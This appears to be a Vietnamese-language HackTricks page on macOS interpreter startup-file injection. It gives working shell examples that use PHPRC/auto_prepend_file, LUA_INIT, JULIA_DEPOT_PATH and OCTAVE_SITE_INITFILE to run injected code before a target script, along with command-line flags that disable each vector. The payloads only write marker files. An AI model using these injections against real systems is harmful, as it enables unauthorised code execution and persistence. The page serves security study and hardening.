# macOS Interpreter Startup-File Injection

{{#include ../../../banners/hacktricks-training.md}}

Các kỹ thuật dành riêng cho runtime này sử dụng biến môi trường được kế thừa để chọn cấu hình khởi động hoặc mã trước script dự kiến. Lua cũng hỗ trợ biến thể dùng mã inline.

## Cấu hình khởi động PHP

### `PHPRC` / `PHP_INI_SCAN_DIR` và `auto_prepend_file`

PHP CLI và CGI đọc cấu hình mỗi khi được gọi. `PHPRC` có thể chọn một tệp `php.ini` mà attacker có thể đọc, trong khi `PHP_INI_SCAN_DIR` có thể chuyển hướng thư mục được quét để tìm các tệp `.ini` bổ sung. Chỉ thị `auto_prepend_file` khiến PHP phân tích một tệp trước script được yêu cầu, vì vậy kết hợp này cho phép thực thi mã khi khởi động.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
cat >/tmp/php-payload.php <<'PHP'
<?php file_put_contents('/tmp/php-prepend-executed', 'ok'); ?>
PHP
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/attacker-php.ini

PHPRC=/tmp/attacker-php.ini php victim.php
```

Một lựa chọn khác là một thư mục chứa tệp `.ini`:

```bash
mkdir -p /tmp/php-conf.d
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/php-conf.d/99-prepend.ini
PHP_INI_SCAN_DIR=/tmp/php-conf.d php victim.php
```

Tùy chọn `-n` bỏ qua `php.ini`; đường dẫn `-c` đáng tin cậy được chỉ định tường minh sẽ được ưu tiên hơn `PHPRC`. Lưu ý rằng SAPI máy chủ chạy lâu dài thường đọc cấu hình khi web server khởi động, trong khi CLI và CGI đọc cấu hình mỗi lần được gọi.<sup>[[1]](#references)</sup>

## Mã khởi động Lua

### `LUA_INIT`

Trước khi xử lý các tùy chọn dòng lệnh hoặc script mục tiêu, trình thông dịch Lua độc lập sẽ thực thi `LUA_INIT_<major>_<minor>` hoặc, nếu biến có phiên bản không tồn tại, `LUA_INIT`. Giá trị bắt đầu bằng `@` chỉ định một tệp; mọi giá trị khác sẽ được đánh giá trực tiếp dưới dạng mã Lua. Điều này cho phép thực thi khi khởi động theo cả cách dùng tệp và không cần tệp.<sup>[[3]](#references)</sup>

```bash
# File-backed
echo 'os.execute("touch /tmp/lua-init-executed")' >/tmp/lua-init.lua
LUA_INIT_5_4=@/tmp/lua-init.lua lua victim.lua

# Fileless
LUA_INIT='os.execute("touch /tmp/lua-inline-executed")' lua victim.lua
```

Tên chính xác có phiên bản thay đổi tùy theo interpreter, ví dụ `LUA_INIT_5_4`. `lua -E` bỏ qua tất cả biến môi trường, bao gồm mã khởi động và đường dẫn module Lua.

## Depot khởi động của Julia

### `JULIA_DEPOT_PATH` và `startup.jl`

Julia thường thực thi `config/startup.jl` từ depot đầu tiên khi khởi động. `JULIA_DEPOT_PATH` kiểm soát danh sách depot, nên trỏ biến này đến một cây thư mục mà kẻ tấn công có thể đọc sẽ chuyển hướng tệp khởi động được tự động tải.<sup>[[4]](#references)[[5]](#references)</sup>

```bash
mkdir -p /tmp/julia-depot/config
echo 'run(`touch /tmp/julia-startup-executed`)' >/tmp/julia-depot/config/startup.jl

# A trailing empty entry expands to Julia's default depots.
JULIA_DEPOT_PATH=/tmp/julia-depot: julia victim.jl
```

Dấu phân cách ở cuối hữu ích khi nạn nhân vẫn cần các package thông thường. `julia --startup-file=no` vô hiệu hóa file khởi động này. Xóa biến trước khi khởi chạy vì biến này cũng kiểm soát các registry, môi trường, cache và vị trí tải mã của package.

## Các file khởi động của GNU Octave

### `OCTAVE_SITE_INITFILE` / `OCTAVE_VERSION_INITFILE`

GNU Octave thực thi một số file chứa các lệnh Octave hợp lệ trong quá trình khởi động. `OCTAVE_SITE_INITFILE` ghi đè file khởi động trên toàn site và `OCTAVE_VERSION_INITFILE` ghi đè file dành riêng cho phiên bản, cho phép một trong hai biến chuyển hướng việc thực thi tự động đến một file mà attacker có thể đọc.<sup>[[6]](#references)</sup>

```bash
cat >/tmp/octave-startup.m <<'OCTAVE'
system('touch /tmp/octave-startup-executed');
OCTAVE

OCTAVE_SITE_INITFILE=/tmp/octave-startup.m octave-cli --quiet victim.m
```

`--no-init-file` chỉ bỏ qua các tệp của người dùng như `~/.octaverc`; tùy chọn này **không** ngăn ghi đè bằng tệp site ở trên. Dùng `--no-site-file` cho các tệp site hoặc `--norc` / `-f` để tắt tất cả tệp khởi động.<sup>[[7]](#references)</sup>

## References

- [1] [Tệp cấu hình PHP](https://www.php.net/manual/en/configuration.file.php)
- [2] [PHP `auto_prepend_file`](https://www.php.net/manual/en/ini.core.php#ini.auto-prepend-file)
- [3] [Trình thông dịch độc lập Lua 5.4](https://www.lua.org/manual/5.4/manual.html#7)
- [4] [Giao diện dòng lệnh Julia: Tệp khởi động](https://docs.julialang.org/en/v1/manual/command-line-interface/#Startup-file)
- [5] [Biến môi trường Julia: `JULIA_DEPOT_PATH`](https://docs.julialang.org/en/v1/manual/environment-variables/#JULIA_DEPOT_PATH)
- [6] [Các tệp khởi động GNU Octave](https://docs.octave.org/latest/Startup-Files.html)
- [7] [Tùy chọn dòng lệnh GNU Octave](https://docs.octave.org/latest/Command-Line-Options.html)
{{#include ../../../banners/hacktricks-training.md}}
